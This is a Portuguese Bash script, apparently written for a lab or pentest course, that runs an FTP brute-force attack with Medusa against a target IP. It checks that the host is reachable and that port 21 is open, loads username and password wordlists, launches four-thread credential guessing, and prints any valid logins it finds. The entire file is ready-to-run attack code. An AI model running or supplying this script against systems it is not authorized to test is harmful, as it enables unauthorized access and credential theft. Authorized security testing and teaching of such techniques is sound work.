#!/bin/bash

#########################################
# Script de Ataque FTP com Medusa
# Uso: ./ataque_ftp.sh <IP_ALVO>
# Autor: Lucas
# Data: 2025-11-13
#########################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Verificar se foi passado um IP
if [ -z "$1" ]; then
    echo -e "${RED}[ERRO]${NC} Por favor, forneça o IP do alvo"
    echo "Uso: $0 <IP_ALVO>"
    exit 1
fi

TARGET=$1
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORDLIST_DIR="$SCRIPT_DIR/../wordlists"
USERS_FILE="$WORDLIST_DIR/usuarios.txt"
PASSWORDS_FILE="$WORDLIST_DIR/senhas_ftp.txt"
RESULTS_FILE="$SCRIPT_DIR/../resultados_ftp_$(date +%Y%m%d_%H%M%S).txt"

echo -e "${YELLOW}[*]${NC} =========================================="
echo -e "${YELLOW}[*]${NC} Iniciando Ataque de Força Bruta em FTP"
echo -e "${YELLOW}[*]${NC} =========================================="
echo -e "${YELLOW}[*]${NC} Alvo: $TARGET"
echo -e "${YELLOW}[*]${NC} Data: $(date)"
echo ""

# Verificar se o Medusa está instalado
if ! command -v medusa &> /dev/null; then
    echo -e "${RED}[ERRO]${NC} Medusa não está instalado!"
    echo "Execute: sudo apt install medusa -y"
    exit 1
fi

# Verificar se o alvo está acessível
echo -e "${YELLOW}[*]${NC} Verificando conectividade com o alvo..."
if ping -c 1 -W 2 "$TARGET" &> /dev/null; then
    echo -e "${GREEN}[+]${NC} Alvo está acessível"
else
    echo -e "${RED}[ERRO]${NC} Alvo não está acessível"
    exit 1
fi

# Verificar se a porta FTP está aberta
echo -e "${YELLOW}[*]${NC} Verificando porta FTP (21)..."
if timeout 5 bash -c "echo > /dev/tcp/$TARGET/21" 2>/dev/null; then
    echo -e "${GREEN}[+]${NC} Porta FTP está aberta"
else
    echo -e "${RED}[ERRO]${NC} Porta FTP está fechada ou filtrada"
    exit 1
fi

# Verificar se os arquivos de wordlist existem
if [ ! -f "$USERS_FILE" ]; then
    echo -e "${RED}[ERRO]${NC} Arquivo de usuários não encontrado: $USERS_FILE"
    exit 1
fi

if [ ! -f "$PASSWORDS_FILE" ]; then
    echo -e "${RED}[ERRO]${NC} Arquivo de senhas não encontrado: $PASSWORDS_FILE"
    exit 1
fi

echo ""
echo -e "${YELLOW}[*]${NC} Configurações do Ataque:"
echo -e "${YELLOW}[*]${NC} - Wordlist de usuários: $USERS_FILE ($(wc -l < "$USERS_FILE") usuários)"
echo -e "${YELLOW}[*]${NC} - Wordlist de senhas: $PASSWORDS_FILE ($(wc -l < "$PASSWORDS_FILE") senhas)"
echo -e "${YELLOW}[*]${NC} - Threads: 4"
echo -e "${YELLOW}[*]${NC} - Arquivo de resultados: $RESULTS_FILE"
echo ""

# Confirmar antes de executar
read -p "Deseja continuar? (s/N): " confirm
if [[ ! $confirm =~ ^[Ss]$ ]]; then
    echo -e "${YELLOW}[*]${NC} Ataque cancelado"
    exit 0
fi

echo ""
echo -e "${GREEN}[+]${NC} Iniciando ataque de força bruta..."
echo ""

# Executar o ataque com Medusa
medusa -h "$TARGET" \
       -U "$USERS_FILE" \
       -P "$PASSWORDS_FILE" \
       -M ftp \
       -t 4 \
       -v 4 \
       -O "$RESULTS_FILE"

# Verificar resultado
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${GREEN}[+]${NC} Ataque concluído!"
    echo -e "${YELLOW}[*]${NC} Resultados salvos em: $RESULTS_FILE"
    
    # Verificar se encontrou credenciais
    if grep -q "SUCCESS" "$RESULTS_FILE"; then
        echo ""
        echo -e "${GREEN}[+]${NC} =========================================="
        echo -e "${GREEN}[+]${NC} CREDENCIAIS ENCONTRADAS:"
        echo -e "${GREEN}[+]${NC} =========================================="
        grep "SUCCESS" "$RESULTS_FILE"
        echo -e "${GREEN}[+]${NC} =========================================="
    else
        echo ""
        echo -e "${RED}[-]${NC} Nenhuma credencial válida encontrada"
    fi
else
    echo ""
    echo -e "${RED}[ERRO]${NC} Ocorreu um erro durante o ataque"
fi

echo ""
echo -e "${YELLOW}[*]${NC} Finalizado em: $(date)"
